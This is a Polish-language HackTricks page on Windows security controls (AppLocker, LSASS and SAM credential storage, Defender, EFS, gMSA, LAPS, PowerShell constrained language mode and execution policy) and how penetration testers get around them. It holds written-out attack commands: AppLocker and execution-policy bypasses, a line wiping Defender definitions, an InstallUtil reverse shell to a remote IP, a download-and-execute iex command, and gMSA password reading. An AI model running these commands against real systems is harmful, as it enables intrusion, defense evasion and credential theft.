# Kontrole zabezpieczeń systemu Windows

<details>

<summary><strong>Zacznij od zera i stań się ekspertem od hakowania AWS dzięki</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegram**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) na githubie.

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Użyj [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), aby łatwo tworzyć i **automatyzować przepływy pracy** przy użyciu **najbardziej zaawansowanych** narzędzi społecznościowych na świecie.\
Zdobądź Dostęp Dziś:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Polityka AppLocker

Biała lista aplikacji to lista zatwierdzonych aplikacji lub plików wykonywalnych, które mogą być obecne i uruchamiane w systemie. Celem jest ochrona środowiska przed szkodliwym oprogramowaniem i niezatwierdzonym oprogramowaniem, które nie jest zgodne z konkretnymi potrzebami biznesowymi organizacji.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) to **rozwiązanie białej listy aplikacji** firmy Microsoft, które daje administratorom systemów kontrolę nad **którymi aplikacjami i plikami użytkownicy mogą uruchamiać**. Zapewnia **dokładną kontrolę** nad plikami wykonywalnymi, skryptami, plikami instalacyjnymi systemu Windows, plikami DLL, aplikacjami pakietowymi i instalatorami aplikacji pakietowych.\
Organizacje często **blokują cmd.exe i PowerShell.exe** oraz dostęp do określonych katalogów, **ale wszystko to można ominąć**.

### Sprawdź

Sprawdź, które pliki/rozszerzenia są na czarnej liście/białej liście:
```powershell
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
Ten ścieżka rejestru zawiera konfiguracje i zasady stosowane przez AppLocker, umożliwiając sprawdzenie bieżącego zestawu reguł egzekwowanych w systemie:

* `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Ominięcie

* Przydatne **Folderu z uprawnieniami do zapisu** do ominięcia zasad AppLocker: Jeśli AppLocker pozwala na wykonanie czegokolwiek wewnątrz `C:\Windows\System32` lub `C:\Windows`, istnieją **foldery z uprawnieniami do zapisu**, które można wykorzystać do **ominięcia tego**.
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
* Powszechnie **zaufane** [**binaria "LOLBAS's"**](https://lolbas-project.github.io/) mogą być również przydatne do ominięcia AppLocker.
* **Słabo napisane reguły mogą również zostać ominięte**
* Na przykład, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, możesz utworzyć **folder o nazwie `allowed`** w dowolnym miejscu i będzie on zezwolony.
* Organizacje często skupiają się na **blokowaniu wykonywalnego pliku `%System32%\WindowsPowerShell\v1.0\powershell.exe`**, ale zapominają o **innych** [**lokalizacjach wykonywalnych plików PowerShell**](https://www.powershelladmin.com/wiki/PowerShell\_Executables\_File\_System\_Locations) takich jak `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` lub `PowerShell_ISE.exe`.
* **Wymuszenie DLL jest bardzo rzadko włączane** ze względu na dodatkowe obciążenie, jakie może wprowadzić dla systemu, oraz ilość testów wymaganych do zapewnienia, że nic nie zostanie uszkodzone. Dlatego korzystanie z **DLL jako tylnych drzwi pomoże w ominięciu AppLocker**.
* Możesz użyć [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) lub [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) do **wykonania kodu Powershell** w dowolnym procesie i ominięcia AppLocker. Aby uzyskać więcej informacji, sprawdź: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).

## Przechowywanie poświadczeń

### Menedżer kont bezpieczeństwa (SAM)

Lokalne poświadczenia są obecne w tym pliku, hasła są zahaszowane.

### Lokalna władza bezpieczeństwa (LSA) - LSASS

**Poświadczenia** (zahaszowane) są **zapisane** w **pamięci** tego podsystemu z powodów jednokrotnego logowania się.\
**LSA** administruje lokalną **polityką bezpieczeństwa** (polityka haseł, uprawnienia użytkowników...), **uwierzytelnianiem**, **tokenami dostępu**...\
LSA będzie tym, który **sprawdzi** podane poświadczenia wewnątrz pliku **SAM** (dla lokalnego logowania) i **będzie komunikować się** z **kontrolerem domeny** w celu uwierzytelnienia użytkownika domeny.

**Poświadczenia** są **zapisane** wewnątrz procesu **LSASS**: bilety Kerberosa, hashe NT i LM, łatwo odszyfrowane hasła.

### Sekrety LSA

LSA może zapisać na dysku niektóre poświadczenia:

* Hasło konta komputera Active Directory (nieosiągalny kontroler domeny).
* Hasła kont użytkowników usług systemu Windows
* Hasła do zaplanowanych zadań
* Więcej (hasło aplikacji IIS...)

### NTDS.dit

To jest baza danych Active Directory. Jest obecna tylko w kontrolerach domeny.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft\_Defender) to program antywirusowy dostępny w systemach Windows 10 i Windows 11, a także w wersjach systemu Windows Server. **Blokuję** on powszechne narzędzia do testów penetracyjnych, takie jak **`WinPEAS`**. Jednak istnieją sposoby **ominięcia tych zabezpieczeń**.

### Sprawdź

Aby sprawdzić **stan** **Defendera**, możesz wykonać polecenie PS **`Get-MpComputerStatus`** (sprawdź wartość **`RealTimeProtectionEnabled`** aby dowiedzieć się, czy jest aktywny):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

Aby go wyliczyć, można również uruchomić:
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## System plików zaszyfrowanych (EFS)

EFS zabezpiecza pliki poprzez szyfrowanie, wykorzystując **klucz symetryczny** znany jako **Klucz Szyfrowania Pliku (FEK)**. Ten klucz jest szyfrowany za pomocą **klucza publicznego** użytkownika i przechowywany w alternatywnym strumieniu danych $EFS zaszyfrowanego pliku. W przypadku konieczności deszyfrowania, odpowiadający **klucz prywatny** certyfikatu cyfrowego użytkownika jest używany do odszyfrowania FEK z $EFS strumienia. Więcej szczegółów można znaleźć [tutaj](https://en.wikipedia.org/wiki/Encrypting\_File\_System).

**Scenariusze deszyfrowania bez inicjacji użytkownika** obejmują:

* Gdy pliki lub foldery są przenoszone do systemu plików nieobsługiwanego przez EFS, takiego jak [FAT32](https://en.wikipedia.org/wiki/File\_Allocation\_Table), są automatycznie deszyfrowane.
* Zaszyfrowane pliki wysyłane przez sieć za pomocą protokołu SMB/CIFS są deszyfrowane przed transmisją.

Ten sposób szyfrowania umożliwia **transparentny dostęp** do zaszyfrowanych plików dla właściciela. Jednakże, po prostu zmiana hasła właściciela i zalogowanie się nie pozwoli na deszyfrowanie.

**Najważniejsze informacje**:

* EFS używa symetrycznego FEK, szyfrowanego kluczem publicznym użytkownika.
* Deszyfrowanie wykorzystuje klucz prywatny użytkownika do uzyskania dostępu do FEK.
* Automatyczne deszyfrowanie zachodzi w określonych warunkach, takich jak kopiowanie do FAT32 lub transmisja sieciowa.
* Zaszyfrowane pliki są dostępne dla właściciela bez dodatkowych kroków.

### Sprawdź informacje o EFS

Sprawdź, czy **użytkownik** korzystał z tej **usługi**, sprawdzając, czy ścieżka istnieje: `C:\users\<nazwa_użytkownika>\appdata\roaming\Microsoft\Protect`

Sprawdź, **kto** ma **dostęp** do pliku, używając `cipher /c \<plik>\`
Możesz także użyć `cipher /e` i `cipher /d` wewnątrz folderu, aby **zaszyfrować** i **odszyfrować** wszystkie pliki.

### Deszyfrowanie plików EFS

#### Będąc w Systemie Władzy

Ten sposób wymaga, aby **użytkownik ofiary** uruchamiał **proces** wewnątrz hosta. W takim przypadku, korzystając z sesji `meterpreter`, można podrobić token procesu użytkownika (`impersonate_token` z `incognito`). Lub można po prostu `migrate` do procesu użytkownika.

#### Znając hasło użytkownika

{% embed url="https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files" %}

## Zarządzane konta usług grupowych (gMSA)

Microsoft opracował **Zarządzane Konta Usług Grupowych (gMSA)**, aby uproszczać zarządzanie kontami usług w infrastrukturach IT. W przeciwieństwie do tradycyjnych kont usług, które często mają ustawienie "**Hasło nigdy nie wygasa**" włączone, gMSA oferują bardziej bezpieczne i zarządzalne rozwiązanie:

* **Automatyczne Zarządzanie Hasłem**: gMSA używają złożonego hasła o długości 240 znaków, które automatycznie zmienia się zgodnie z polityką domeny lub komputera. Ten proces jest obsługiwany przez Usługę Dystrybucji Kluczy (KDC) firmy Microsoft, eliminując konieczność ręcznej aktualizacji hasła.
* **Wzmocnione Bezpieczeństwo**: Te konta są odporne na blokady i nie mogą być używane do interaktywnych logowań, co zwiększa ich bezpieczeństwo.
* **Wsparcie dla Wielu Hostów**: gMSA mogą być współdzielone przez wiele hostów, co sprawia, że są idealne dla usług działających na wielu serwerach.
* **Zdolność do Planowania Zadań**: W przeciwieństwie do zarządzanych kont usług, gMSA obsługują uruchamianie zaplanowanych zadań.
* **Uproszczone Zarządzanie SPN**: System automatycznie aktualizuje Nazwę Podstawową Usługi (SPN) w przypadku zmian w szczegółach konta sAMaccount komputera lub nazwy DNS, upraszczając zarządzanie SPN.

Hasła dla gMSA są przechowywane w właściwości LDAP _**msDS-ManagedPassword**_ i są automatycznie resetowane co 30 dni przez kontrolery domeny (DC). To hasło, zaszyfrowany blok danych znany jako [MSDS-MANAGEDPASSWORD\_BLOB](https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e), może być pobrane tylko przez upoważnionych administratorów i serwery, na których zainstalowane są gMSA, zapewniając bezpieczne środowisko. Aby uzyskać dostęp do tych informacji, wymagane jest zabezpieczone połączenie, takie jak LDAPS, lub połączenie musi być uwierzytelnione za pomocą 'Sealing & Secure'.

![https://cube0x0.github.io/Relaying-for-gMSA/](../.gitbook/assets/asd1.png)

Możesz odczytać to hasło za pomocą [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**
```
/GMSAPasswordReader --AccountName jkohler
```
[**Znajdź więcej informacji w tym poście**](https://cube0x0.github.io/Relaying-for-gMSA/)

Sprawdź również tę [stronę internetową](https://cube0x0.github.io/Relaying-for-gMSA/) dotyczącą sposobu przeprowadzenia ataku **przekazywania NTLM** w celu **odczytania** **hasła** **gMSA**.

## LAPS

**Local Administrator Password Solution (LAPS)**, dostępne do pobrania z [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899), umożliwia zarządzanie hasłami lokalnych administratorów. Te hasła, które są **losowe**, unikalne i **regularnie zmieniane**, są przechowywane centralnie w Active Directory. Dostęp do tych haseł jest ograniczony za pomocą list kontroli dostępu (ACL) do autoryzowanych użytkowników. Przy odpowiednich uprawnieniach udzielonych, możliwe jest odczytanie haseł lokalnych administratorów.

{% content-ref url="active-directory-methodology/laps.md" %}
[laps.md](active-directory-methodology/laps.md)
{% endcontent-ref %}

## Tryb ograniczonego języka PowerShell

Tryb [**Ograniczonego Języka PowerShell**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **blokuje wiele funkcji** potrzebnych do efektywnego korzystania z PowerShell, takich jak blokowanie obiektów COM, zezwalanie tylko na zatwierdzone typy .NET, przepływy pracy oparte na XAML, klasy PowerShell i wiele innych.

### **Sprawdź**
```powershell
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### Ominięcie
```powershell
#Easy bypass
Powershell -version 2
```
W obecnym systemie Windows to Bypass nie zadziała, ale możesz użyć [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).\
**Aby go skompilować, możesz potrzebować** **dodać odwołanie** -> _Przeglądaj_ -> _Przeglądaj_ -> dodać `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` i **zmienić projekt na .Net4.5**.

#### Bezpośrednie obejście:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### Odwrócony shell:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
Możesz użyć [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) lub [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) do **wykonania kodu Powershell** w dowolnym procesie i ominięcia trybu ograniczonego. Więcej informacji znajdziesz tutaj: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).

## Polityka wykonania PS

Domyślnie jest ustawiona na **restricted.** Główne sposoby obejścia tej polityki:
```powershell
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
Więcej informacji można znaleźć [tutaj](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)

## Interfejs dostawcy obsługi zabezpieczeń (SSPI)

To interfejs API, który może być używany do uwierzytelniania użytkowników.

SSPI będzie odpowiedzialny za znalezienie odpowiedniego protokołu dla dwóch maszyn, które chcą komunikować się. Preferowaną metodą jest Kerberos. Następnie SSPI negocjuje, który protokół uwierzytelniania zostanie użyty. Te protokoły uwierzytelniania nazywane są Dostawcami Obsługi Zabezpieczeń (SSP), znajdują się w postaci plików DLL w każdej maszynie z systemem Windows, a obie maszyny muszą obsługiwać ten sam protokół, aby móc się komunikować.

### Główne SSP

* **Kerberos**: Preferowany
* %windir%\Windows\System32\kerberos.dll
* **NTLMv1** i **NTLMv2**: Z powodów zgodności
* %windir%\Windows\System32\msv1\_0.dll
* **Digest**: Serwery internetowe i LDAP, hasło w postaci skrótu MD5
* %windir%\Windows\System32\Wdigest.dll
* **Schannel**: SSL i TLS
* %windir%\Windows\System32\Schannel.dll
* **Negotiate**: Używany do negocjacji protokołu do użycia (Kerberos lub NTLM, przy czym Kerberos jest domyślny)
* %windir%\Windows\System32\lsasrv.dll

#### Negocjacje mogą oferować kilka metod lub tylko jedną.

## UAC - Kontrola konta użytkownika

[Kontrola konta użytkownika (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) to funkcja umożliwiająca **wyświetlanie monitu o zgodę na podniesione działania**.

{% content-ref url="windows-security-controls/uac-user-account-control.md" %}
[uac-user-account-control.md](windows-security-controls/uac-user-account-control.md)
{% endcontent-ref %}

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Użyj [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), aby łatwo tworzyć i **automatyzować zadania** przy użyciu najbardziej zaawansowanych narzędzi społeczności.\
Zdobądź dostęp już dziś:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

***

<details>

<summary><strong>Dowiedz się, jak hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
